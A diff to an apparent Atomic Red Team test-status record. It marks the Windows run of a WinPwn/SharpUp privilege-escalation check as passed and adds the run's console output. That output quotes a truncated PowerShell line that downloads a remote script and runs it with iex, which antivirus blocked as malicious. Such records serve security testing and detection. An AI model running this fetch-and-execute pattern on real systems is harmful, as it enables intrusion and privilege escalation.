@@ -2,12 +2,11 @@
   "guid": "efb79454-1101-4224-a4d0-30c9c8b29ffc",
   "platforms": {
     "windows": {
-      "consecutive_failures": 1,
-      "last_status": "failed",
-      "stdout": "",
+      "consecutive_failures": 0,
+      "last_status": "passed",
+      "stdout": "PathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nCheckPrereq's for: \r\nT1082-22 WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors\r\n\r\nPrerequisites met: \r\nT1082-22 WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting test: \r\nT1082-22 WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors\r\n\r\n+ function Invoke-SharpUp\r\niex : At line:1 char:1\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nInvoke-SharpUp : The term 'Invoke-SharpUp' is not recognized as the name of a cmdlet, function, script file, or \r\noperable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try \r\nagain.\r\nAt line:3 char:1\r\n+ Invoke-SharpUp -command \"audit\"}\r\n+ ~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Invoke-SharpUp:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException\r\nExit code: 0\r\nDone executing test: \r\nT1082-22 WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting cleanup for test: \r\nT1082-22 WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors\r\n\r\nDone executing cleanup for test: \r\nT1082-22 WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors\r\n\r\n",
       "stderr": "",
-      "exit_code": 1,
-      "last_error": "The process cannot access the file 'C:\\Users\\runneradmin\\AppData\\Local\\Temp\\tmp0umwnl.tmp' because it is being used by another process."
+      "exit_code": 0
     }
   }
 }
